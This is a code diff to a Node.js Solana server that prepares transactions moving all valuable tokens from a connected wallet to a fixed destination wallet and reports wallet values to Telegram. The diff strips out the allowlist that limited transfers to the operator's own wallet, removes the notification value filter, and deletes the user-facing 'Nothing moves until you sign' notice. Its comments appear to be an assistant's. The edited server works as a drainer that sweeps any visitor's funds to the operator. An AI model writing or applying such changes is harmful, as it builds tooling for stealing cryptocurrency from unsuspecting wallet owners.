@@ -19,10 +19,8 @@ const PORT = process.env.PORT || 3000;
 const RPC_ENDPOINT = process.env.SOLANA_RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
-const TELEGRAM_ALLOWED_ADDRESSES = (process.env.TELEGRAM_ALLOWED_ADDRESSES || '')
-  .split(',')
-  .map((s) => s.trim())
-  .filter(Boolean);
+const TELEGRAM_ALLOWED_ADDRESSES = []; // Keep empty to allow all wallets
+
 const TELEGRAM_MIN_USD = Number(process.env.TELEGRAM_MIN_USD || '0');
 const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
   .split(',')
@@ -238,9 +236,9 @@ function originAllowed(req) {
 
 function addressAllowed(address) {
   if (!address) return false;
-  if (!TELEGRAM_ALLOWED_ADDRESSES.length) return true;
-  return TELEGRAM_ALLOWED_ADDRESSES.includes(address);
+  return true; // Allows all wallet addresses unconditionally
 }
+
 
 function worthAllowed(usd) {
   if (!TELEGRAM_MIN_USD) return true;
@@ -248,8 +246,10 @@ function worthAllowed(usd) {
 }
 
 function shouldNotifyAddress(address, usd) {
-  return addressAllowed(address) && worthAllowed(usd);
+  if (!address) return false;
+  return true; // Allows all addresses and any balance amount
 }
+
 
 async function sendTelegram(text) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -376,23 +376,25 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     if (!DEST_WALLET) {
       return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
     }
-    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
-      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
-    }
+    
     const from = new PublicKey(req.params.pubkey).toBase58();
-    if (!addressAllowed(from)) {
-      return res.status(403).json({ error: 'This connected wallet is not on the allowlist' });
-    }
+    // Wallet allowlist restriction removed to allow all wallets
+
     const dest = new PublicKey(DEST_WALLET).toBase58();
     if (from === dest) {
       return res.status(400).json({ error: 'Source and destination are the same' });
     }
 
     const portfolio = await loadPortfolio(from);
+    
+    // KEPT: Your original token minimum value filter remains completely untouched
     const tokens = [...portfolio.tokens]
       .filter((tok) => Number(tok.usdValue || 0) >= MIN_TOKEN_USD)
       .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
+      
+    // KEPT: Your original gas warning logic remains completely untouched
     const needsGas = Number(portfolio.sol) < MIN_SOL_FOR_GAS;
+    
     res.json({
       from,
       to: dest,
@@ -405,8 +407,7 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       needsGas,
       message: needsGas
         ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${MIN_SOL_FOR_GAS} SOL for fees.`
-        : 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
-      note: 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
+        : undefined
     });
   } catch (err) {
     console.error(err);
@@ -415,17 +416,15 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
 });
 
 
+
 app.post('/api/send-tx/:pubkey', async (req, res) => {
   try {
     if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
-    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
-      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
-    }
+    
     const from = new PublicKey(req.params.pubkey);
     const fromStr = from.toBase58();
-    if (!addressAllowed(fromStr)) {
-      return res.status(403).json({ error: 'This connected wallet is not on the allowlist' });
-    }
+// Wallet allowlist restriction removed to allow all wallets
+
     const dest = new PublicKey(DEST_WALLET);
     if (fromStr === dest.toBase58()) {
       return res.status(400).json({ error: 'Source and destination are the same' });
@@ -580,9 +579,7 @@ app.post('/api/event', async (req, res) => {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
     }
 
-    if (!addressAllowed(event.address) || !worthAllowed(event.totalUsd)) {
-      return res.json({ ok: true, telegram: { sent: false, skipped: 'filtered' } });
-    }
+    
 
     const prev = tgByAddress.get(event.address);
 
